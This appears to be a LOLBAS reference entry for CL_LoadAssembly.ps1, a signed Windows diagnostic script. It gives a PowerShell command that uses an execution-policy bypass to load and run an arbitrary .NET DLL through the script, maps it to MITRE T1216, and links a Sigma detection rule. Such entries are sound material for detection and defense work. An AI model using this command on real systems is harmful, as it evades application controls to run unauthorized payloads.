---
Acknowledgement:
- Person: Ji
Author: Jimmy (@bohops)
Commands:
- Category: Execute
  Command: powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio;
    import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
  Description: Proxy execute Managed DLL with PowerShell
  MitreID: T1216
  OperatingSystem: Windows 10 21H1 (likely other versions as well), Windows 11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  Usecase: Execute proxied payload with Microsoft signed binary
Created: 2021-09-26
Description: PowerShell Diagnostic Script
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/ff6c54ded6b52f379cec11fe17c1ccb956faa660/rules/windows/process_creation/proc_creation_win_lolbas_cl_loadassembly.yml
Full_Path:
- Path: C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1
Name: CL_LoadAssembly.ps1
Resources:
- Link: https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/
mitre_data:
  technique_ids:
  - T1216
tags:
- lolbas/osscripts
---

# CL_LoadAssembly.ps1

PowerShell Diagnostic Script

# Path(s)

- `C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1`

# Execute Commands

Proxy execute Managed DLL with PowerShell

```batch
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
```

- **Usecase:** Execute proxied payload with Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10 21H1 (likely other versions as well), Windows 11



# Resource(s)

- https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/
# Acknowledgements

- Jimmy (@bohops) (Authored, 2021-09-26)
- Ji